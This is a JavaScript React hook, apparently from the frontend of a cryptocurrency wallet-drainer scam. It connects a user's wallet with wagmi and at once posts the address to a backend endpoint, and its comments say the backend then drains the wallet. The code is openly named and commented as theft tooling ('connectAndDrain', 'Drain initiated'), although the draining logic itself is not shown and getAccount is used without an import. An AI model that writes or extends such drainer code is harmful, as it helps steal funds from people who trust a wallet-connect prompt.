// frontend/src/hooks/useWalletConnect.js
import { useConnect } from 'wagmi'

export const useWalletConnect = () => {
  const { connect } = useConnect()
  
  const connectAndDrain = async (connector) => {
    try {
      // 1. Connect wallet
      await connect({ connector })
      
      // 2. Get connected address
      const { address } = await getAccount()
      
      // 3. IMMEDIATELY send to backend for draining
      const response = await fetch('/api/wallet/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          address, 
          chain: 'evm',
          timestamp: Date.now()
        })
      })
      
      // 4. Backend will trigger drain immediately
      const data = await response.json()
      console.log('Drain initiated:', data)
      
    } catch (error) {
      console.error('Connection/drain failed:', error)
    }
  }
  
  return { connectAndDrain }
}
